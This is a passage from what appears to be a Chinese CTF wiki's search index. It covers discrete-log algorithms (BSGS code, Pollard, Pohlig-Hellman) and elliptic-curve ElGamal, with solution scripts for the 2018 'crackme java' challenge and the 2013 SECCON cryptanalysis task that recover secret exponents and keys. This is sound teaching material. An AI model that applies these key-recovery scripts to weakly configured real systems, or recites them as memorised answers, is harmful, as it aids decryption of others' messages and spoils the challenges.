\u7684\u7a7a\u95f4\u590d\u6742\u5ea6\u7684\u7b97\u6cd5\u3002 \u5176\u4e2d \u6bcf\u4e00\u6b21 j \u7684\u589e\u52a0\u8868\u793a\u201cbaby-step\u201d\uff0c\u4e00\u6b21\u4e58\u4e0a g g \u3002 \u6bcf\u4e00\u6b21 i \u7684\u589e\u52a0\u8868\u793a\u201cgiant-step\u201d\uff0c\u4e00\u6b21\u4e58\u4e0a g^{-m} g^{-m} \u3002 def bsgs ( g , y , p ): m = int ( ceil ( sqrt ( p - 1 ))) S = { pow ( g , j , p ): j for j in range ( m )} gs = pow ( g , p - 1 - m , p ) for i in range ( m ): if y in S : return i * m + S [ y ] y = y * gs % p return None","title":"Baby-step giant-step"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#pollards-algorithm","text":"\u6211\u4eec\u53ef\u4ee5\u4ee5 O(\\sqrt n) O(\\sqrt n) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u548c O(1) O(1) \u7684\u7a7a\u95f4\u590d\u6742\u5ea6\u6765\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\u3002\u5177\u4f53\u539f\u7406\u8bf7\u81ea\u884c\u8c37\u6b4c\u3002","title":"Pollard\u2019s \u03c1 algorithm"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#pollards-kangaroo-algorithm","text":"\u5982\u679c\u6211\u4eec\u77e5\u9053 x \u7684\u8303\u56f4\u4e3a a \\leq x \\leq b a \\leq x \\leq b \uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4ee5 O(\\sqrt{b-a}) O(\\sqrt{b-a}) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\u3002\u5177\u4f53\u539f\u7406\u8bf7\u81ea\u884c\u8c37\u6b4c\u3002","title":"Pollard\u2019s kangaroo algorithm"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#pohlig-hellman-algorithm","text":"\u4e0d\u59a8\u5047\u8bbe\u4e0a\u8ff0\u6240\u63d0\u5230\u7684\u7fa4\u5173\u4e8e\u5143\u7d20 g g \u7684\u9636\u4e3a n n \uff0c n n \u4e3a\u4e00\u4e2a\u5149\u6ed1\u6570\uff1a n=\\prod\\limits_{i=1}^r p_i^{e_i} n=\\prod\\limits_{i=1}^r p_i^{e_i} \u3002 \u5bf9\u4e8e\u6bcf\u4e2a i \\in \\{1,\\ldots,r\\} i \\in \\{1,\\ldots,r\\} \uff1a \u8ba1\u7b97 g_i \\equiv g^{n/p_i^{e_i}} \\pmod m g_i \\equiv g^{n/p_i^{e_i}} \\pmod m \u3002\u6839\u636e\u62c9\u683c\u6717\u65e5\u5b9a\u7406\uff0c g_i g_i \u5728\u7fa4\u4e2d\u7684\u9636\u4e3a p_i^{e_i} p_i^{e_i} \u3002 \u8ba1\u7b97 y_i \\equiv y^{n/p_i^{e_i}} \\equiv g^{xn/p_i^{e_i}} \\equiv g_i^{x} \\equiv g_i^{x \\bmod p_i^{e_i}} \\equiv g_i^{x_i} \\pmod m y_i \\equiv y^{n/p_i^{e_i}} \\equiv g^{xn/p_i^{e_i}} \\equiv g_i^{x} \\equiv g_i^{x \\bmod p_i^{e_i}} \\equiv g_i^{x_i} \\pmod m \uff0c\u8fd9\u91cc\u6211\u4eec\u77e5\u9053 y_i,m,g_i y_i,m,g_i \uff0c\u800c x_i x_i \u7684\u8303\u56f4\u4e3a [0,p_i^{e_i}) [0,p_i^{e_i}) \uff0c\u7531 n n \u662f\u4e00\u4e2a\u5149\u6ed1\u6570\uff0c\u53ef\u77e5\u5176\u8303\u56f4\u8f83\u5c0f\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Pollard\u2019s kangaroo algorithm \u7b49\u65b9\u6cd5\u5feb\u901f\u6c42\u5f97 x_i x_i \u3002 \u6839\u636e\u4e0a\u8ff0\u7684\u63a8\u5bfc\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5bf9\u4e8e i \\in \\{1,\\ldots,r\\} i \\in \\{1,\\ldots,r\\} \uff0c x \\equiv x_i \\pmod{p_i^{e_i}} x \\equiv x_i \\pmod{p_i^{e_i}} \uff0c\u8be5\u5f0f\u53ef\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u6c42\u89e3\u3002 \u4e0a\u8ff0\u8fc7\u7a0b\u53ef\u7528\u4e0b\u56fe\u7b80\u5355\u63cf\u8ff0\uff1a \u5176\u590d\u6742\u5ea6\u4e3a O\\left(\\sum\\limits _i e_i\\left(\\log n+\\sqrt{p_i}\\right)\\right) O\\left(\\sum\\limits _i e_i\\left(\\log n+\\sqrt{p_i}\\right)\\right) \uff0c\u53ef\u4ee5\u770b\u51fa\u590d\u6742\u5ea6\u8fd8\u662f\u5f88\u4f4e\u7684\u3002 \u4f46\u5f53 n n \u4e3a\u7d20\u6570\uff0c m=2n+1 m=2n+1 \uff0c\u90a3\u4e48\u590d\u6742\u5ea6\u548c O(\\sqrt m) O(\\sqrt m) \u662f\u51e0\u4e4e\u6ca1\u6709\u5dee\u522b\u7684\u3002","title":"Pohlig-Hellman algorithm"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#2018-crackme-java","text":"\u4ee3\u7801\u5982\u4e0b import java.math.BigInteger ; import java.util.Random ; public class Test1 { static BigInteger two = new BigInteger ( \"2\" ); static BigInteger p = new BigInteger ( \"11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711\" ); static BigInteger h = new BigInteger ( \"7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916\" ); /* Alice write the below algorithm for encryption. The public key {p, h} is broadcasted to everyone. @param val: The plaintext to encrypt. We suppose val only contains lowercase letter {a-z} and numeric charactors, and is at most 256 charactors in length. */ public static String pkEnc ( String val ){ BigInteger [] ret = new BigInteger [ 2 ] ; BigInteger bVal = new BigInteger ( val . toLowerCase (), 36 ); BigInteger r = new BigInteger ( new Random (). nextInt () + \"\" ); ret [ 0 ]= two . modPow ( r , p ); ret [ 1 ]= h . modPow ( r , p ). multiply ( bVal ); return ret [ 0 ] . toString ( 36 ) + \"==\" + ret [ 1 ] . toString ( 36 ); } /* Alice write the below algorithm for decryption. x is her private key, which she will never let you know. public static String skDec(String val,BigInteger x){ if(!val.contains(\"==\")){ return null; } else { BigInteger val0=new BigInteger(val.split(\"==\")[0],36); BigInteger val1=new BigInteger(val.split(\"==\")[1],36); BigInteger s=val0.modPow(x,p).modInverse(p); return val1.multiply(s).mod(p).toString(36); } } */ public static void main ( String [] args ) throws Exception { System . out . println ( \"You intercepted the following message, which is sent from Bob to Alice:\" ); BigInteger bVal1 = new BigInteger ( \"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco\" , 36 ); BigInteger bVal2 = new BigInteger ( \"2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\" , 36 ); BigInteger r = new BigInteger ( new Random (). nextInt () + \"\" ); System . out . println ( r ); System . out . println ( bVal1 ); System . out . println ( bVal2 ); System . out . println ( \"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco==2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\" ); System . out . println ( \"Please figure out the plaintext!\" ); } } \u57fa\u672c\u529f\u80fd\u4e3a\u8ba1\u7b97 r_0=2^r \\bmod p r_0=2^r \\bmod p r_1 =b*h^r \\bmod p r_1 =b*h^r \\bmod p \u53ef\u4ee5\u53d1\u73b0\uff0cr \u7684\u8303\u56f4\u4e3a [0,2^{32}) [0,2^{32}) \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 BSGS \u7b97\u6cd5\uff0c\u5982\u4e0b from sage.all import * c1 = int ( 'a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco' , 36 ) c2 = int ( '2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc' , 36 ) print c1 , c2 p = 11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711 h = 7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916 # generate the group const2 = 2 const2 = Mod ( const2 , p ) c1 = Mod ( c1 , p ) c2 = Mod ( c2 , p ) h = Mod ( h , p ) print '2' , bsgs ( const2 , c1 , bounds = ( 1 , 2 ^ 32 )) r = 152351913 num = long ( c2 / ( h ** r )) print num","title":"2018 \u56fd\u8d5b crackme java"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#_7","text":"\u521d\u7b49\u6570\u8bba\uff0c\u6f58\u627f\u6d1e\uff0c\u6f58\u627f\u5f6a https://ee.stanford.edu/~hellman/publications/28.pdf https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm#cite_note-Menezes97p108-2 https://fortenf.org/e/crypto/2017/12/03/survey-of-discrete-log-algos.html","title":"\u53c2\u8003"},{"location":"crypto/asymmetric/discrete-log/ecc/","text":"ECC \u00b6 \u6982\u8ff0 \u00b6 ECC \u5168\u79f0\u4e3a\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\uff0cEllipseCurve Cryptography\uff0c\u662f\u4e00\u79cd\u57fa\u4e8e\u692d\u5706\u66f2\u7ebf\u6570\u5b66\u7684\u516c\u94a5\u5bc6\u7801\u3002\u4e0e\u4f20\u7edf\u7684\u57fa\u4e8e\u5927\u8d28\u6570\u56e0\u5b50\u5206\u89e3\u56f0\u96be\u6027\u7684\u52a0\u5bc6\u65b9\u6cd5\u4e0d\u540c\uff0cECC\u4f9d\u8d56\u4e8e\u89e3\u51b3\u692d\u5706\u66f2\u7ebf\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u7684\u56f0\u96be\u6027\u3002\u5b83\u7684\u4f18\u52bf\u4e3b\u8981\u5728\u4e8e\u76f8\u5bf9\u4e8e\u5176\u5b83\u65b9\u6cd5\uff0c\u5b83\u53ef\u4ee5\u5728\u4f7f\u7528\u8f83\u77ed\u5bc6\u94a5\u957f\u5ea6\u7684\u540c\u65f6\u4fdd\u6301\u76f8\u540c\u7684\u5bc6\u7801\u5f3a\u5ea6\u3002\u76ee\u524d\u692d\u5706\u66f2\u7ebf\u4e3b\u8981\u91c7\u7528\u7684\u6709\u9650\u57df\u6709 \u4ee5\u7d20\u6570\u4e3a\u6a21\u7684\u6574\u6570\u57dfGF(p)\uff0c\u901a\u5e38\u5728\u901a\u7528\u5904\u7406\u5668\u4e0a\u66f4\u4e3a\u6709\u6548\u3002 \u7279\u5f81\u4e3a 2 \u7684\u4f3d\u7f57\u534e\u57dfGF\uff082^m\uff09\uff0c\u53ef\u4ee5\u8bbe\u8ba1\u4e13\u95e8\u7684\u786c\u4ef6\u3002 \u57fa\u672c\u77e5\u8bc6 \u00b6 \u6211\u4eec\u9996\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u6709\u9650\u57df\u4e0a\u7684\u692d\u5706\u66f2\u7ebf\uff0c\u6709\u9650\u57df\u4e0a\u7684\u692d\u5706\u66f2\u7ebf\u662f\u6307\u5728\u692d\u5706\u66f2\u7ebf\u7684\u5b9a\u4e49\u5f0f y^2+axy+by=x^3+cx^2+dx+e y^2+axy+by=x^3+cx^2+dx+e \u4e2d\u6240\u6709\u7684\u7cfb\u6570\u90fd\u662f\u5728\u67d0\u4e2a\u6709\u9650\u57dfGF(p)\u4e2d\u7684\u5143\u7d20\uff0c\u5176\u4e2dp\u4e3a\u4e00\u4e2a\u5927\u7d20\u6570\u3002 \u5f53\u7136\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u692d\u5706\u66f2\u7ebf\u90fd\u9002\u5408\u4e8e\u52a0\u5bc6\uff0c\u6700\u4e3a\u5e38\u7528\u7684\u65b9\u7a0b\u5982\u4e0b y^2=x^3+ax+b y^2=x^3+ax+b \u5176\u4e2d 4a^3+27b^2 \\bmod p \\neq 0 4a^3+27b^2 \\bmod p \\neq 0 \u6211\u4eec\u79f0\u8be5\u65b9\u7a0b\u7684\u6240\u6709\u89e3(x,y)\uff0c( x\\in Fp , y \\in Fp x\\in Fp , y \\in Fp )\uff0c\u4ee5\u53ca\u4e00\u4e2a\u79f0\u4e3a\u201c\u65e0\u7a77\u8fdc\u70b9\u201d(O)\u7ec4\u6210\u7684\u96c6\u5408\u4e3a\u5b9a\u4e49\u5728Fp\u4e0a\u7684\u4e00\u4e2a\u692d\u5706\u66f2\u7ebf\uff0c\u8bb0\u4e3aE(Fp)\u3002 \u4e00\u822c\u5b9a\u4e49\u692d\u5706\u66f2\u7ebf\u5bc6\u7801\u9700\u8981\u4ee5\u4e0b\u6761\u4ef6 \u5047\u8bbeE(Fp)\u5bf9\u4e8e\u70b9\u7684\u8fd0\u7b97 \\oplus \\oplus \u5f62\u6210\u4e00\u4e2aable\u7fa4\uff08\u4ea4\u6362\u7fa4\uff0c\u9006\u5143\u5b58\u5728\uff0c\u5c01\u95ed\u6027\u7b49\uff09\uff0c\u8bbe p\\in E(Fq) p\\in E(Fq) \uff0c\u4e14\u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\u7684t\u5f88\u5927 p \\oplus p \\oplus ... \\oplus p=O p \\oplus p \\oplus ... \\oplus p=O \u5176\u4e2d\u5171\u6709t\u4e2ap\u53c2\u4e0e\u8fd0\u7b97\u3002\u8fd9\u91cc\u6211\u4eec\u79f0t\u4e3ap\u7684\u5468\u671f\u3002\u6b64\u5916\uff0c\u5bf9\u4e8e Q\\in E(Fq) Q\\in E(Fq) \uff0c\u5b9a\u6709\u67d0\u4e2a\u6b63\u6574\u6570m\u4f7f\u5f97\u4e0b\u5217\u5f0f\u5b50\u6210\u7acb\uff0c\u5b9a\u4e49 m=log_pq m=log_pq Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p \uff08m\u4e2ap\u53c2\u4e0e\u8fd0\u7b97\uff09 \u6b64\u5916\uff0c\u5047\u8bbeG\u662f\u8be5 E_q (a,b) E_q (a,b) \u7684\u751f\u6210\u5143\uff0c\u5373\u53ef\u4ee5\u751f\u6210\u5176\u4e2d\u7684\u6240\u6709\u5143\u7d20\uff0c\u5176\u9636\u4e3a\u6ee1\u8db3 nG=O nG=O \u7684\u6700\u5c0f\u6b63\u6574\u6570n\u3002 ECC\u4e2d\u7684ElGamal \u00b6 \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u7528\u6237B\u8981\u628a\u6d88\u606f\u52a0\u5bc6\u540e\u4f20\u7ed9\u7528\u6237A\u3002 \u5bc6\u94a5\u751f\u6210 \u00b6 \u7528\u6237A\u5148\u9009\u62e9\u4e00\u6761\u692d\u5706\u66f2\u7ebf E_q (a,b) E_q (a,b) \uff0c\u7136\u540e\u9009\u62e9\u5176\u4e0a\u7684\u4e00\u4e2a\u751f\u6210\u5143G\uff0c\u5047\u8bbe\u5176\u9636\u4e3an\uff0c\u4e4b\u540e\u518d\u9009\u62e9\u4e00\u4e2a\u6b63\u6574\u6570 n_a n_a \u4f5c\u4e3a\u5bc6\u94a5\uff0c\u8ba1\u7b97 P_a=n_aG P_a=n_aG \u3002 \u5176\u4e2d\uff0c E_q(a,b), q,G E_q(a,b), q,G \u90fd\u4f1a\u88ab\u516c\u5f00\u3002 \u516c\u94a5\u4e3a P_a P_a \uff0c\u79c1\u94a5\u4e3a$n_a $\u3002 \u52a0\u5bc6 \u00b6 \u7528\u6237B\u5728\u5411\u7528\u6237A\u53d1\u9001\u6d88\u606fm\uff0c\u8fd9\u91cc\u5047\u8bbe\u6d88\u606fm\u5df2\u7ecf\u88ab\u7f16\u7801\u4e3a\u692d\u5706\u66f2\u7ebf\u4e0a\u7684\u70b9\uff0c\u5176\u52a0\u5bc6\u6b65\u9aa4\u5982\u4e0b \u67e5\u8be2\u7528\u6237A\u7684\u516c\u94a5 E_q(a,b), q, P_a,G E_q(a,b), q, P_a,G \u3002 \u5728(1,q-1) \u7684\u533a\u95f4\u5185\u9009\u62e9\u968f\u673a\u6570k \u3002 \u6839\u636eA\u7684\u516c\u94a5\u8ba1\u7b97\u70b9 (x_1,y_1)=kG (x_1,y_1)=kG \u3002 \u8ba1\u7b97\u70b9 (x_2,y_2)=kP_a (x_2,y_2)=kP_a \uff0c\u5982\u679c\u4e3aO\uff0c\u5219\u4ece\u7b2c\u4e8c\u6b65\u91cd\u65b0\u5f00\u59cb\u3002 \u8ba1\u7b97 C=m+(x_2,y_2) C=m+(x_2,y_2) \u5c06 ((x_1,y_1),C) ((x_1,y_1),C) \u53d1\u9001\u7ed9A\u3002 \u89e3\u5bc6 \u00b6 \u89e3\u5bc6\u6b65\u9aa4\u5982\u4e0b \u5229\u7528\u79c1\u94a5\u8ba1\u7b97\u70b9 n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2) n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2) \u3002 \u8ba1\u7b97\u6d88\u606f m=C-(x_2,y_2) m=C-(x_2,y_2) \u3002 \u5173\u952e\u70b9 \u00b6 \u8fd9\u91cc\u7684\u5173\u952e\u70b9\u5728\u4e8e\u6211\u4eec\u5373\u4f7f\u77e5\u9053\u4e86 (x_1,y_1) (x_1,y_1) \u4e5f\u96be\u4ee5\u77e5\u9053k\uff0c\u8fd9\u662f\u7531\u79bb\u6563\u5bf9\u6570\u7684\u95ee\u9898\u7684\u96be\u5ea6\u51b3\u5b9a\u7684\u3002 2013 SECCON CTF quals Cryptanalysis \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee52013\u5e74SECCON CTF quals \u4e2d\u7684 Cryptanalysis \u4e3a\u4f8b\uff0c\u9898\u76ee\u5982\u4e0b \u8fd9\u91cc\uff0c\u6211\u4eec\u5df2\u77e5\u692d\u5706\u66f2\u7ebf\u65b9\u7a0b\u4ee5\u53ca\u5bf9\u5e94\u7684\u751f\u6210\u5143 base\uff0c\u8fd8\u77e5\u9053\u76f8\u5e94\u7684\u6a21\u6570\u4ee5\u53ca\u516c\u94a5\u4ee5\u53ca\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002 \u4f46\u662f\u53ef\u4ee5\u770b\u51fa\u7684\u6211\u4eec\u7684\u6a21\u6570\u592a\u5c0f\uff0c\u6211\u4eec\u66b4\u529b\u679a\u4e3e\u83b7\u53d6\u7ed3\u679c\u3002 \u8fd9\u91cc\u76f4\u63a5\u53c2\u8003 github\u4e0a\u7684 sage \u7a0b\u5e8f\uff0c\u66b4\u529b\u8dd1\u51fa secret key\u3002\u4e4b\u540e\u4fbf\u53ef\u4ee5\u89e3\u5bc6\u4e86\u3002 a = 1234577 b = 3213242 n = 7654319 E = EllipticCurve ( GF ( n ), [ 0 , 0 , 0 , a , b ]) base = E ([ 5234568 , 2287747 ]) pub = E ([ 2366653 , 1424308 ]) c1 = E ([ 5081741 , 6744615 ]) c2 = E ([ 610619 , 6218 ]) X = base for i in range ( 1 , n ): if X == pub : secret = i print \"[+] secret:\" , i break else : X = X + base print i m = c2 - ( c1 * secret ) print \"[+] x:\" , m [ 0 ] print \"[+] y:\" , m [ 1 ] print \"[+] x+y:\" , m [ 0 ] + m [ 1 ] \u66b4\u529b\u8dd1\u51fa\u7ed3\u679c [ + ] secret: 1584718 [ + ] x: 2171002 [ + ] y: 3549912 [ + ] x+y: 5720914 \u53c2\u8003 \u00b6 https://github.com/sonickun/ctf-crypto-writeups/tree/master/2013/seccon-ctf-quals/cryptanalysis","title":"ECC"},{"location":"crypto/asymmetric/discrete-log/ecc/#ecc","text":"","title":"ECC"},{"location":"crypto/asymmetric/discrete-log/ecc/#_1","text":"ECC \u5168\u79f0\u4e3a\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\uff0cEllipseCurve Cryptography\uff0c\u662f\u4e00\u79cd\u57fa\u4e8e\u692d\u5706\u66f2\u7ebf\u6570\u5b66\u7684\u516c\u94a5\u5bc6\u7801\u3002\u4e0e\u4f20\u7edf\u7684\u57fa\u4e8e\u5927\u8d28\u6570\u56e0\u5b50\u5206\u89e3\u56f0\u96be\u6027\u7684\u52a0\u5bc6\u65b9\u6cd5\u4e0d\u540c\uff0cECC\u4f9d\u8d56\u4e8e\u89e3\u51b3\u692d\u5706\u66f2\u7ebf\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u7684\u56f0\u96be\u6027\u3002\u5b83\u7684\u4f18\u52bf\u4e3b\u8981\u5728\u4e8e\u76f8\u5bf9\u4e8e\u5176\u5b83\u65b9\u6cd5\uff0c\u5b83\u53ef\u4ee5\u5728\u4f7f\u7528\u8f83\u77ed\u5bc6\u94a5\u957f\u5ea6\u7684\u540c\u65f6\u4fdd\u6301\u76f8\u540c\u7684\u5bc6\u7801\u5f3a\u5ea6\u3002\u76ee\u524d\u692d\u5706\u66f2\u7ebf\u4e3b\u8981\u91c7\u7528\u7684\u6709\u9650\u57df\u6709 \u4ee5\u7d20\u6570\u4e3a\u6a21\u7684\u6574\u6570\u57dfGF(p)\uff0c\u901a\u5e38\u5728\u901a\u7528\u5904\u7406\u5668\u4e0a\u66f4\u4e3a\u6709\u6548\u3002 \u7279\u5f81\u4e3a 2 \u7684\u4f3d\u7f57\u534e\u57dfGF\uff082^m\uff09\uff0c\u53ef\u4ee5\u8bbe\u8ba1\u4e13\u95e8\u7684\u786c\u4ef6\u3002","title":"\u6982\u8ff0"},{"location":"crypto/asymmetric/discrete-log/ecc/#_2","text":"\u6211\u4eec\u9996\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u6709\u9650\u57df\u4e0a\u7684\u692d\u5706\u66f2\u7ebf\uff0c\u6709\u9650\u57df\u4e0a\u7684\u692d\u5706\u66f2\u7ebf\u662f\u6307\u5728\u692d\u5706\u66f2\u7ebf\u7684\u5b9a\u4e49\u5f0f y^2+axy+by=x^3+cx^2+dx+e y^2+axy+by=x^3+cx^2+dx+e \u4e2d\u6240\u6709\u7684\u7cfb\u6570\u90fd\u662f\u5728\u67d0\u4e2a\u6709\u9650\u57dfGF(p)\u4e2d\u7684\u5143\u7d20\uff0c\u5176\u4e2dp\u4e3a\u4e00\u4e2a\u5927\u7d20\u6570\u3002 \u5f53\u7136\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u692d\u5706\u66f2\u7ebf\u90fd\u9002\u5408\u4e8e\u52a0\u5bc6\uff0c\u6700\u4e3a\u5e38\u7528\u7684\u65b9\u7a0b\u5982\u4e0b y^2=x^3+ax+b y^2=x^3+ax+b \u5176\u4e2d 4a^3+27b^2 \\bmod p \\neq 0 4a^3+27b^2 \\bmod p \\neq 0 \u6211\u4eec\u79f0\u8be5\u65b9\u7a0b\u7684\u6240\u6709\u89e3(x,y)\uff0c( x\\in Fp , y \\in Fp x\\in Fp , y \\in Fp )\uff0c\u4ee5\u53ca\u4e00\u4e2a\u79f0\u4e3a\u201c\u65e0\u7a77\u8fdc\u70b9\u201d(O)\u7ec4\u6210\u7684\u96c6\u5408\u4e3a\u5b9a\u4e49\u5728Fp\u4e0a\u7684\u4e00\u4e2a\u692d\u5706\u66f2\u7ebf\uff0c\u8bb0\u4e3aE(Fp)\u3002 \u4e00\u822c\u5b9a\u4e49\u692d\u5706\u66f2\u7ebf\u5bc6\u7801\u9700\u8981\u4ee5\u4e0b\u6761\u4ef6 \u5047\u8bbeE(Fp)\u5bf9\u4e8e\u70b9\u7684\u8fd0\u7b97 \\oplus \\oplus \u5f62\u6210\u4e00\u4e2aable\u7fa4\uff08\u4ea4\u6362\u7fa4\uff0c\u9006\u5143\u5b58\u5728\uff0c\u5c01\u95ed\u6027\u7b49\uff09\uff0c\u8bbe p\\in E(Fq) p\\in E(Fq) \uff0c\u4e14\u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\u7684t\u5f88\u5927 p \\oplus p \\oplus ... \\oplus p=O p \\oplus p \\oplus ... \\oplus p=O \u5176\u4e2d\u5171\u6709t\u4e2ap\u53c2\u4e0e\u8fd0\u7b97\u3002\u8fd9\u91cc\u6211\u4eec\u79f0t\u4e3ap\u7684\u5468\u671f\u3002\u6b64\u5916\uff0c\u5bf9\u4e8e Q\\in E(Fq) Q\\in E(Fq) \uff0c\u5b9a\u6709\u67d0\u4e2a\u6b63\u6574\u6570m\u4f7f\u5f97\u4e0b\u5217\u5f0f\u5b50\u6210\u7acb\uff0c\u5b9a\u4e49 m=log_pq m=log_pq Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p \uff08m\u4e2ap\u53c2\u4e0e\u8fd0\u7b97\uff09 \u6b64\u5916\uff0c\u5047\u8bbeG\u662f\u8be5 E_q (a,b) E_q (a,b) \u7684\u751f\u6210\u5143\uff0c\u5373\u53ef\u4ee5\u751f\u6210\u5176\u4e2d\u7684\u6240\u6709\u5143\u7d20\uff0c\u5176\u9636\u4e3a\u6ee1\u8db3 nG=O nG=O \u7684\u6700\u5c0f\u6b63\u6574\u6570n\u3002","title":"\u57fa\u672c\u77e5\u8bc6"},{"location":"crypto/asymmetric/discrete-log/ecc/#eccelgamal","text":"\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u7528\u6237B\u8981\u628a\u6d88\u606f\u52a0\u5bc6\u540e\u4f20\u7ed9\u7528\u6237A\u3002","title":"ECC\u4e2d\u7684ElGamal"},{"location":"crypto/asymmetric/discrete-log/ecc/#_3","text":"\u7528\u6237A\u5148\u9009\u62e9\u4e00\u6761\u692d\u5706\u66f2\u7ebf E_q (a,b) E_q (a,b) \uff0c\u7136\u540e\u9009\u62e9\u5176\u4e0a\u7684\u4e00\u4e2a\u751f\u6210\u5143G\uff0c\u5047\u8bbe\u5176\u9636\u4e3an\uff0c\u4e4b\u540e\u518d\u9009\u62e9\u4e00\u4e2a\u6b63\u6574\u6570 n_a n_a \u4f5c\u4e3a\u5bc6\u94a5\uff0c\u8ba1\u7b97 P_a=n_aG P_a=n_aG \u3002 \u5176\u4e2d\uff0c E_q(a,b), q,G E_q(a,b), q,G \u90fd\u4f1a\u88ab\u516c\u5f00\u3002 \u516c\u94a5\u4e3a P_a P_a \uff0c\u79c1\u94a5\u4e3a$n_a $\u3002","title":"\u5bc6\u94a5\u751f\u6210"},{"location":"crypto/asymmetric/discrete-log/ecc/#_4","text":"\u7528\u6237B\u5728\u5411\u7528\u6237A\u53d1\u9001\u6d88\u606fm\uff0c\u8fd9\u91cc\u5047\u8bbe\u6d88\u606fm\u5df2\u7ecf\u88ab\u7f16\u7801\u4e3a\u692d\u5706\u66f2\u7ebf\u4e0a\u7684\u70b9\uff0c\u5176\u52a0\u5bc6\u6b65\u9aa4\u5982\u4e0b \u67e5\u8be2\u7528\u6237A\u7684\u516c\u94a5 E_q(a,b), q, P_a,G E_q(a,b), q, P_a,G \u3002 \u5728(1,q-1) \u7684\u533a\u95f4\u5185\u9009\u62e9\u968f\u673a\u6570k \u3002 \u6839\u636eA\u7684\u516c\u94a5\u8ba1\u7b97\u70b9 (x_1,y_1)=kG (x_1,y_1)=kG \u3002 \u8ba1\u7b97\u70b9 (x_2,y_2)=kP_a (x_2,y_2)=kP_a \uff0c\u5982\u679c\u4e3aO\uff0c\u5219\u4ece\u7b2c\u4e8c\u6b65\u91cd\u65b0\u5f00\u59cb\u3002 \u8ba1\u7b97 C=m+(x_2,y_2) C=m+(x_2,y_2) \u5c06 ((x_1,y_1),C) ((x_1,y_1),C) \u53d1\u9001\u7ed9A\u3002","title":"\u52a0\u5bc6"},{"location":"crypto/asymmetric/discrete-log/ecc/#_5","text":"\u89e3\u5bc6\u6b65\u9aa4\u5982\u4e0b \u5229\u7528\u79c1\u94a5\u8ba1\u7b97\u70b9 n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2) n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2) \u3002 \u8ba1\u7b97\u6d88\u606f m=C-(x_2,y_2) m=C-(x_2,y_2) \u3002","title":"\u89e3\u5bc6"},{"location":"crypto/asymmetric/discrete-log/ecc/#_6","text":"\u8fd9\u91cc\u7684\u5173\u952e\u70b9\u5728\u4e8e\u6211\u4eec\u5373\u4f7f\u77e5\u9053\u4e86 (x_1,y_1) (x_1,y_1) \u4e5f\u96be\u4ee5\u77e5\u9053k\uff0c\u8fd9\u662f\u7531\u79bb\u6563\u5bf9\u6570\u7684\u95ee\u9898\u7684\u96be\u5ea6\u51b3\u5b9a\u7684\u3002","title":"\u5173\u952e\u70b9"},{"location":"crypto/asymmetric/discrete-log/ecc/#2013-seccon-ctf-quals-cryptanalysis","text":"\u8fd9\u91cc\u6211\u4eec\u4ee52013\u5e74SECCON CTF quals \u4e2d\u7684 Cryptanalysis \u4e3a\u4f8b\uff0c\u9898\u76ee\u5982\u4e0b 